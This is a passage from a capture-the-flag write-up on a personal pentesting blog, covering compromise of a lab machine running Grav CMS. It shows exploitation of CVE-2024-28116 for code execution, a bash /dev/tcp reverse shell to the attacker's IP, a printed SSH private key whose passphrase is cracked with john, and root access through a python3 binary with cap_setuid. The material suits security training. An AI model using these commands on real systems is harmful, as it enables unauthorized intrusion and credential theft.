Googling where is administration panel for <code>Grav CMS</code> leads to <a href=https://learn.getgrav.org/17/admin-panel/introduction#usage class=external-link target=_blank rel=noopener>this documentation</a>. There, they say we should visit <code>/admin</code> directory. Therefore, visiting <code>http://10.20.1.128/admin</code> shows a new panel:</p><p><img alt="Webos 3" src=/pentesting/images/Webos_3.png></p><p>If there we put the credentials <code>admin:Perico69*****</code> they work, and we are inside the panel:</p><p><img alt="Webos 4" src=/pentesting/images/Webos_4.png></p><p>At the very bottom of this panel I can see a version: <code>Grav v1.7.44</code>:</p><p><img alt="Webos 5" src=/pentesting/images/Webos_5.png></p><p>Searching for <code>Grav CMS</code> exploit for this version leads to a vulnerability labeled as <a href=https://nvd.nist.gov/vuln/detail/CVE-2024-28116 class=external-link target=_blank rel=noopener>CVE-2024-28116</a>. We also find <a href=https://github.com/akabe1/Graver class=external-link target=_blank rel=noopener>this Github repository called <code>Graver</code></a> that provides an exploit. Based on the documentation, we can run this exploit doing:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=gp>#</span> python3 graver.py -t &lt;target_url&gt; -p &lt;target_port&gt;
</span></span></code></pre></div><p>but it is an authenticated <code>Server Side Template Injection</code> + <code>Remote Code Execution</code> exploit, i.e., we need to put credentials somewhere. Analyzing the source code for <code>graver.py</code> (the exploit code that is in the repository), we can see at line 37 and 38 that it asks for user and password:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>&lt;</span><span class=n>SNIP</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>##############################################</span>
</span></span><span class=line><span class=cl><span class=c1># Enter here your Grav CMS editor credentials</span>
</span></span><span class=line><span class=cl><span class=n>username</span> <span class=o>=</span> <span class=s2>&#34;youruser&#34;</span>
</span></span><span class=line><span class=cl><span class=n>password</span> <span class=o>=</span> <span class=s2>&#34;yourpassword&#34;</span>
</span></span><span class=line><span class=cl><span class=c1>##############################################</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>SNIP</span><span class=o>&gt;</span>
</span></span></code></pre></div><p>there, we change the lines to be <code>username = 'admin'</code> and <code>password = 'Perico69*****'</code> (the credentials found).</p><p>If we then run the exploit, and apparently it works:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 grav_exploit.py -t http://10.20.1.128
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>RCE payload injected, now visit the malicious page at: &#39;http://10.20.1.128:80/hacked_P9AI?do=&#39;
</span></span></span></code></pre></div><p>Visiting the website the output tells us, shows a simple page:</p><p><img alt="Webos 6" src=/pentesting/images/Webos_6.png></p><p>but I cannot execute code even if we visit something like <code>http://10.20.1.128:80/hacked_P9AI?do=</code> or something similar.</p><p>Searching, we also find <a href="https://ethicalhacking.uk/videos/CVE-2024-28116/#gsc.tab=0" class=external-link target=_blank rel=noopener>this video</a> where they use this same exploit and then show how to execute code. Basically, once the page has been created, we have to go to the main panel and then go <code>P√°ginas</code> (<code>Pages</code>) tab. This redirects to <code>/admin/pages</code> directory. Once there, we can see the webpage created by the exploit:</p><p><img alt="Webos 8" src=/pentesting/images/Webos_8.png></p><p>Clicking on the file name redirects to <code>/admin/pages/&lt;page-name></code>. In our case, since the page name is <code>hacked_P9AI</code> it will redirect to <code>/admin/pages/hacked_p9ai</code>. We now can see its content:</p><p><img alt="Webos 9" src=/pentesting/images/Webos_9.png></p><p>and change the string <code>whoami</code> to <code>ping -c1 10.20.1.110</code>, where <code>10.20.1.110</code> is our attacker&rsquo;s machine IP address.</p><p><img alt="Webos 10" src=/pentesting/images/Webos_10.png></p><p>and click on <code>Guardar</code> (<code>Save</code>) button at the top right.
Basically, we will try to send a <code>ping</code> to our attacker machine to check if <code>Remote Code Execution</code> (<code>RCE</code>) works.</p><p>Start <code>tcpdump</code> to listen for <code>ICMP</code> traces in <code>eth0</code> net interface (the network where we have connectivity to the victim machine):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo tcpdump -ni eth0 icmp
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
</span></span></span><span class=line><span class=cl><span class=go>listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
</span></span></span></code></pre></div><p>Now, if we visit <code>http://10.20.1.128/hacked_p9ai</code> we can see the <code>ping</code> command has been executed:</p><p><img alt="Webos 11" src=/pentesting/images/Webos_11.png></p><p>and if I check my <code>tcpdump</code> listener we got something:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo tcpdump -ni eth0 icmp
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
</span></span></span><span class=line><span class=cl><span class=go>listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
</span></span></span><span class=line><span class=cl><span class=go>19:33:22.826339 IP 10.20.1.128 &gt; 10.20.1.110: ICMP echo request, id 55659, seq 1, length 64
</span></span></span><span class=line><span class=cl><span class=go>19:33:22.826357 IP 10.20.1.110 &gt; 10.20.1.128: ICMP echo reply, id 55659, seq 1, length 64
</span></span></span></code></pre></div><p>We got a <code>ping</code> from <code>10.20.1.128</code>, which is the victim&rsquo;s IP address. So we have reached <code>RCE</code>.</p><p>Since this worked, I will go back to <code>/admin/pages</code> directory, and edit our malicious file again. But this time I will add the payload:</p><p><img alt="Webos 12" src=/pentesting/images/Webos_12.png></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bash -c <span class=s2>&#34;bash -i &gt;&amp; /dev/tcp/10.20.1.110/443 0&gt;&amp;1&#34;</span>
</span></span></code></pre></div><p>where <code>10.20.1.110</code> is my attacker IP address and <code>443</code> is the port I will start listening with <code>netcat</code> to obtain a reverse shell.</p><p>We save the page with the payload and start a <code>netcat</code> listener on port <code>443</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span></code></pre></div><p>Finally, visit the malicious page with the payload (in our case <code>http://10.20.1.128/hacked_p9ai</code>) and we obtain a reverse shell as <code>www-data</code> user:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.20.1.110] from (UNKNOWN) [10.20.1.128] 60254
</span></span></span><span class=line><span class=cl><span class=go>bash: cannot set terminal process group (539): Inappropriate ioctl for device
</span></span></span><span class=line><span class=cl><span class=go>bash: no job control in this shell
</span></span></span><span class=line><span class=cl><span class=go>www-data@TheHackersLabs-Webos:/var/www/html$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>www-data
</span></span></span></code></pre></div><p>After looking for some interesting things, I find an interesting file at <code>/opt</code> directory:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@TheHackersLabs-Webos:/var/www/html$ ls -la /opt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 12
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  2 webos webos 4096 Jul  6 14:34 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 18 root  root  4096 Jul  6 14:31 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 webos webos 3434 Jul  6 13:56 id_rsa
</span></span></span></code></pre></div><p>where we can see an <code>id_rsa</code> key whose owner is <code>webos</code>.</p><p>Reading its content:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@TheHackersLabs-Webos:/var/www/html$ cat /opt/id_rsa
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span></span><span class=line><span class=cl><span class=go>b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABD4ZP0Iyn
</span></span></span><span class=line><span class=cl><span class=go>wv6EzfObd0USFbAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDKenJrjXC6
</span></span></span><span class=line><span class=cl><span class=go>OCWl5WhP4KDa+B7Rv9GdhlZa91O1noGKfOBLqderInRTRJxvhiuMFbpO4xwjhB4A5QYcp1
</span></span></span><span class=line><span class=cl><span class=go>14PQ6h2b5NLvoKxcLvlGqCBhKM9DtveO144I/Fp/XlDN5yh1roWVx8rfRHp2kFQK122q9D
</span></span></span><span class=line><span class=cl><span class=go>8fycSIHL45H5adPb5qK+QlV9xzCoVR7qhxK4QBbz/Pzrl8bPqMlw3EA8of8wsus1b5WBNs
</span></span></span><span class=line><span class=cl><span class=go>Xv/CqtRT8/OIVZA560b8maqf1dI0RxdUkggBYll0xtcQPoT08rawJbUrIV98OZW+KwJBp5
</span></span></span><span class=line><span class=cl><span class=go>MiSJBDxr6x+TSMJRuAxtf75hQjjIo6+EAItwyYzrva+tAl5y4bzZgMeNv7213CMkW0ljBw
</span></span></span><span class=line><span class=cl><span class=go>B6Kyl+4IDcagT4DOwI0wQGQPFMWSewhDcItbyWq6dYeru5Cbj/SiQ7fhPOpsg78RoZA3tb
</span></span></span><span class=line><span class=cl><span class=go>HbfdGOcC1vXpH3jAL6QR+ByK9HeGtKl8xvrC33Vc7vm+pQdCzllyfjQ4jiNMZKB7EOZT1E
</span></span></span><span class=line><span class=cl><span class=go>a8jZW+XARzuIBxlZzLMDAK5BnBtR7UA+uC4MbkXDwD4WjG6uHyu4RF2guyD3/1T4T8e3Z9
</span></span></span><span class=line><span class=cl><span class=go>ZiYcwntg1stBXc34kc+PVmDpUPtLhJ8TyHca3gDDifRLOyfSThRlo7Hg33wPgUTjjlL2Bg
</span></span></span><span class=line><span class=cl><span class=go>UEW0kyGIIpx7Q9FCk5dK/LKORImoeNVumW2gXcl681LwAAB1DVzVbFv37ynqMpft+cx4eV
</span></span></span><span class=line><span class=cl><span class=go>SvsYBYkIL3kcdy0/PH7LRNOoLVX04Wy2vxzsthB6Nh48SOJlGrFHxeg4VJUXdZ06n9Hk+t
</span></span></span><span class=line><span class=cl><span class=go>3dlLdZyackN2MYnDCdoiowwuSMiwIrOaUhWjz4J8/zYA/EMZXVPVEyiBkP2qb2zNwTqS5W
</span></span></span><span class=line><span class=cl><span class=go>YsxsNPjRFzQ5OpTsc0wGClIMDrMokA9Qc+zQRog5n8N8NBawaKCUKGDqZY4DqtilvBIDfP
</span></span></span><span class=line><span class=cl><span class=go>etDu/cZYxhr97HVt11B5LSZBlR23qyomnbyOUCxBz/QUzQaU3UvfNhKe2PbdYUOHUWcdYR
</span></span></span><span class=line><span class=cl><span class=go>6sheRmoylVU/jA+P63Z9nfC3J+6yHycmQXQgQdUlQTIiDbTJcoAj2QXPcMqIdWDCVjxTx4
</span></span></span><span class=line><span class=cl><span class=go>Wlr4xoI+mhoi+PGvUpoXuDO3JkptUp3SHYKANDEREnbotmjnAvr53GuCDTUvTaXgjln1at
</span></span></span><span class=line><span class=cl><span class=go>jZC1v5+sTu0rd77wydMf1NKgQ8FxkCJxafpfwb/aNCwdPzmHlWIHAZzu8S0CGJGbW4yJxa
</span></span></span><span class=line><span class=cl><span class=go>aBpedaFdxkxZRH2iG56Z8kSPno6DUTp2adIqowIr+6dByv3KK3iXHkBm5zxJBMF4U0Z9ra
</span></span></span><span class=line><span class=cl><span class=go>fH/Sbvwfex+v0cH4TLHP3/xI3op/zzVgCIlEs3uQHysGuuEsFE+ICUQUQ3KgEGaMbMKeAm
</span></span></span><span class=line><span class=cl><span class=go>fNOw5yNg4laRrHrvrmTqfhH9DfnYF0mRmFbj3QO59lgO2HbWDiaribGXT5B1SvCV6j0N1G
</span></span></span><span class=line><span class=cl><span class=go>l3ss7TohQPvHeAbCdU5v8L8B0j+NbltGg7aMZPdMwypgKS4F3Zu0Iun9A6DqicvN7aYDp1
</span></span></span><span class=line><span class=cl><span class=go>PIpbezE1rxgcCgGjGe9TDYQJSWUmU3n8pfANfTn6uwkAWLRSBpQjkSzCwUjgSmR7sfXZ36
</span></span></span><span class=line><span class=cl><span class=go>g0lSh5pYhYOgV9s2OHPQz+sw+NxjgQQdwKg786OnEtyZJopkvNuICM3se13PiZLGQOXuDr
</span></span></span><span class=line><span class=cl><span class=go>NMiw6WjBiB/RtVhgrfXukIPKPf17CD3M81iQn1ZuhLdQajrg2MC36yKK9qlz0Yr70YTIQ4
</span></span></span><span class=line><span class=cl><span class=go>hsYSEjRX5q/9+yMwxTpXkUp2z+gypV9ipOloCmeYNYhroVbj+JJ3xzNytY9QmCAaewFTCv
</span></span></span><span class=line><span class=cl><span class=go>IPcKdNjzU6IKmnNrWoZcHj/UY7BouupdLryKVMCkZ4tgaytMB4NwEO+y4Frz5+eXlASpvM
</span></span></span><span class=line><span class=cl><span class=go>AFfLEevk90n2JmQ7IopBeY0axilX7ylw9xb7pWpi7EkX1Q3IR4k05Je93KiV/76Qmbl2uO
</span></span></span><span class=line><span class=cl><span class=go>4sFA/tX6PLkWHFrlJ5hT/YdT785zR7qFokCWhGdX8/nYilHbHiU60GS2tzV9pxvPjajjqt
</span></span></span><span class=line><span class=cl><span class=go>BXKcaJkYYyCdamN94wU1eRqJfIXWJH2P9wK5NegvkMO0oKLqCmZh9I0OejjzlzvhtTwD2W
</span></span></span><span class=line><span class=cl><span class=go>I91lHp8GLSUVxsLblT1egrJmC+WOZQNrvS13nn+5eCq92sPsuUnsbWdLdbve5QET2jKjqD
</span></span></span><span class=line><span class=cl><span class=go>DKKfnDT5tKBju79rESaOcS64YBilm3lFfeRj12ViZ9Z8T/nkUP0BMj1XgCa+2KgRvP7TtD
</span></span></span><span class=line><span class=cl><span class=go>1DhqYbh8JKEkA/Pmwn+wnCYBwK7WgwTyfkBnvwZZgrNub6UdaCH1EsHw4Ghqy3GKJpNB0r
</span></span></span><span class=line><span class=cl><span class=go>RWvbm1kbvtvVmhW4unTMUy3PEt5e89J8yoFOhZEGFgnzgpeAM0sJL0hlUKFSVHl7hrgL54
</span></span></span><span class=line><span class=cl><span class=go>auYPahPbrjjgbQaNoyoqsaAz3SR0Fr/gB8fTUrqT0EOpF0kQ+0dy7Qc9YE4bXl+LVN06Jh
</span></span></span><span class=line><span class=cl><span class=go>t4J7/NNa4eYhKNowUq/7F3bVIcfPn+4wnf1D50UOTv9RJq595cWig8PCU+cEczDTzxRm51
</span></span></span><span class=line><span class=cl><span class=go>BQkC0AxtHHlI+E6o7ygY5W3eaJo0fieJ9rWYJBKLgZ7sFouOqBescUfM3Nwcxs4JqBzxhw
</span></span></span><span class=line><span class=cl><span class=go>2x8kMlNjlP7BL7BLBe02jS3NzZI1n9pD77MVdWwrSW7fLFEUUa8V6q3pP2nfV994XUB5Fo
</span></span></span><span class=line><span class=cl><span class=go>/dlcrpqxf9oJKpn5V9zDq2AROD/H6ktl17lYeUGnm9MkAghf5Jqh7Qe+RygzFCYdbA+ak2
</span></span></span><span class=line><span class=cl><span class=go>C4SwUz+H3S5K7VBll31jrTdf2qQ9+2Z75Jkq6xfmbV72NN557jdu6/DPgjrFUvkof80Xb5
</span></span></span><span class=line><span class=cl><span class=go>Gigt+S16QeHHXbE4odDbPhZwrzf3GJCb1bsNtTKbYI1Ta4QAHs+9I9AanBwJiiJ1Hudt3p
</span></span></span><span class=line><span class=cl><span class=go>n3myvrrLMmCBURtfbBKaaYdJ8y0Vvl9PWuRQFzNaSZ4HSSYqHDmHrcqpb25aYxF28cxbd+
</span></span></span><span class=line><span class=cl><span class=go>35P8WAVRESkTAlheO9djGPCu/BBTu5ncFFrjL63pomLavvzLRlJOf0jI0A8YqQVnMqRiJl
</span></span></span><span class=line><span class=cl><span class=go>Ty/pnkh0LGDKg2F0i8OrihgWC95zCpPzMOLlaB0P6BbTnCaK54qqewnFAk7O55xdmu2+Q6
</span></span></span><span class=line><span class=cl><span class=go>xmxVsy2XGQLNYELvVpfBjQTwhDQHpmrdGMxA1MCJqOC5gV5osoXQ+qfM3npzkzlwGiNZsp
</span></span></span><span class=line><span class=cl><span class=go>j517hQKVg/HP0c/lQFSTbrBcmXGljqH29IqiP3E9Mhx6vbWw26LB47psxl+UQLcFa26VS5
</span></span></span><span class=line><span class=cl><span class=go>ezFLIVT0OZPkK1bB3I2tLpXi0=
</span></span></span><span class=line><span class=cl><span class=go>-----END OPENSSH PRIVATE KEY-----
</span></span></span></code></pre></div><p>We save this key into a file in our attacker machine and call it <code>webos_id_rsa</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nvim webos_id_rsa
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ chmod 600 webos_id_rsa
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ ssh -i webos_id_rsa webos@10.20.1.128
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>The authenticity of host &#39;10.20.1.128 (10.20.1.128)&#39; can&#39;t be established.
</span></span></span><span class=line><span class=cl><span class=go>ED25519 key fingerprint is SHA256:w8UgTBmuwG1smfcGc48qBPhvE6qd3suezLv4a6dEt2M.
</span></span></span><span class=line><span class=cl><span class=go>This key is not known by any other names.
</span></span></span><span class=line><span class=cl><span class=go>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span class=line><span class=cl><span class=go>Warning: Permanently added &#39;10.20.1.128&#39; (ED25519) to the list of known hosts.
</span></span></span><span class=line><span class=cl><span class=go>Enter passphrase for key &#39;webos_id_rsa&#39;:
</span></span></span></code></pre></div><p>but it asks for a passphrase.</p><p>We can then use <code>ssh2john</code> to extract the hash for this passphrase and store it into a file called <code>webos_passphrase</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ssh2john webos_id_rsa &gt; webos_passphrase
</span></span></span></code></pre></div><p>and then attempt to crack it with <code>JohnTheRipper</code> (<code>john</code>) through a <code>Brute Force Password Cracking</code> with <code>rockyou.txt</code> dictionary:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ john --wordlist=/usr/share/wordlists/rockyou.txt webos_passphrase
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Using default input encoding: UTF-8
</span></span></span><span class=line><span class=cl><span class=go>Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
</span></span></span><span class=line><span class=cl><span class=go>Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
</span></span></span><span class=line><span class=cl><span class=go>Cost 2 (iteration count) is 16 for all loaded hashes
</span></span></span><span class=line><span class=cl><span class=go>Will run 5 OpenMP threads
</span></span></span><span class=line><span class=cl><span class=go>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span></span></span><span class=line><span class=cl><span class=go>freestyle        (webos_id_rsa)
</span></span></span><span class=line><span class=cl><span class=go>1g 0:00:01:45 DONE (2024-09-05 19:55) 0.009493g/s 33.41p/s 33.41c/s 33.41C/s beaver..dracula
</span></span></span><span class=line><span class=cl><span class=go>Use the &#34;--show&#34; option to display all of the cracked passwords reliably
</span></span></span><span class=line><span class=cl><span class=go>Session completed.
</span></span></span></code></pre></div><p>We find a passphrase for the key: <code>freestyle</code>.</p><p>We can then log in via <code>SSH</code> to the target machine providing this passphrase to the key:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ssh -i webos_id_rsa webos@10.20.1.128
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Enter passphrase for key &#39;webos_id_rsa&#39;: freestyle
</span></span></span><span class=line><span class=cl><span class=go>Linux TheHackersLabs-Webos 6.1.0-22-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.94-1 (2024-06-21) x86_64
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>The programs included with the Debian GNU/Linux system are free software;
</span></span></span><span class=line><span class=cl><span class=go>the exact distribution terms for each program are described in the
</span></span></span><span class=line><span class=cl><span class=go>individual files in /usr/share/doc/*/copyright.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span></span><span class=line><span class=cl><span class=go>permitted by applicable law.
</span></span></span><span class=line><span class=cl><span class=go>Last login: Thu Jul 18 11:45:53 2024 from 192.168.18.19
</span></span></span><span class=line><span class=cl><span class=go>webos@TheHackersLabs-Webos:~$
</span></span></span></code></pre></div><p>and we are in as <code>webos</code> user.</p><p>We can read the flag <code>user.txt</code> at this user <code>/home</code> directory.</p><hr><h2 id=root>Root
<a class=heading-link href=#root><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>Once inside, I check files inside <code>/home/webos</code> directory. There is a totally unusual file owned by <code>root</code>, that is a <code>Python|python3</code> binary:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>webos@TheHackersLabs-Webos:~$ ls -la
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 6716
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 5 webos webos    4096 jul 18 11:31 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 4 root  root     4096 jul  6 13:45 ..
</span></span></span><span class=line><span class=cl><span class=go>lrwxrwxrwx 1 root  root        9 jul 18 11:31 .bash_history -&gt; /dev/null
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 webos webos     220 abr 23  2023 .bash_logout
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 webos webos    3526 abr 23  2023 .bashrc
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 3 webos webos    4096 jul  6 14:36 .local
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 webos webos     807 abr 23  2023 .profile
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 root  root  6839928 jul  6 14:10 python3
</span></span></span><span class=line><span class=cl><span class=go>drwx------ 2 webos webos    4096 jul  6 13:55 .ssh
</span></span></span><span class=line><span class=cl><span class=go>-r-------- 1 webos webos      36 jul 18 11:02 user.txt
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 2 webos webos    4096 jul 17 20:47 webito
</span></span></span></code></pre></div><p>We check what type of file is this running <code>file</code> command. However, there is no <code>file</code> command in the system, which is weird&mldr;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>webos@TheHackersLabs-Webos:~$ file /home/webos/python3
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-bash: file: orden no encontrada
</span></span></span></code></pre></div><p>If we want fo check for <code>Capabilities</code>, we usually use <code>getcap</code> command. However, this is also not in the system:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>webos@TheHackersLabs-Webos:~$ getcap /home/webos/python3
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-bash: getcap: orden no encontrada
</span></span></span></code></pre></div><p>We can use <code>find</code> to search for it in the system:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>webos@TheHackersLabs-Webos:~$ find / -name getcap -type f 2&gt;/dev/null
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>/usr/sbin/getcap
</span></span></span></code></pre></div><p>and it is stored at <code>/usr/bin</code> directory.</p><p>Checking our <code>PATH</code> environment variable <code>/usr/sbin</code> is not contained, therefore the system cannot find <code>getcap</code> binary. Using <code>getcap</code> on system shows that this unusual binary has capabilities:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>webos@TheHackersLabs-Webos:~$ /usr/sbin/getcap -r / 2&gt;/dev/null
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>/usr/bin/ping cap_net_raw=ep
</span></span></span><span class=line><span class=cl><span class=go>/home/webos/python3 cap_setuid=ep
</span></span></span></code></pre></div><p>We have <code>cap_setuid</code> enabled, which means we can use it to get privileged access.</p><p>Finally, we can go to <code>GTFOBins</code> webpage, search for <a href=https://gtfobins.github.io/gtfobins/python/#capabilities class=external-link target=_blank rel=noopener>Python capabilities</a> and exploit it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>webos@TheHackersLabs-Webos:~$ /home/webos/python3 -c &#39;import os; os.setuid(0); os.system(&#34;/bin/sh&#34;)&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>#</span> whoami
</span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>root
</span></span></span></code></pre></div><p>and we are <code>root</code> user.</p><p>We can get the <code>root.txt</code> flag at <code>/root</code> directory.</p><p>~ Happy Hacking</p><h2 id=extra-grav-cms-exploit>Extra: <code>Grav CMS</code> exploit
<a class=heading-link href=#extra-grav-cms-exploit><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>I have also created an exploit that execute commands based on the vulnerability <a href=https://nvd.nist.gov/vuln/detail/CVE-2024-28116 class=external-link target=_blank rel=noopener>CVE-2024-28116</a> shown in this WriteUp. To get it, just visit: <a href=https://github.com/gunzf0x/Grav-CMS-RCE-Authenticated class=external-link target=_blank rel=noopener>https://github.com/gunzf0x/Grav-CMS-RCE-Authenticated</a> to execute commands remotely.</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>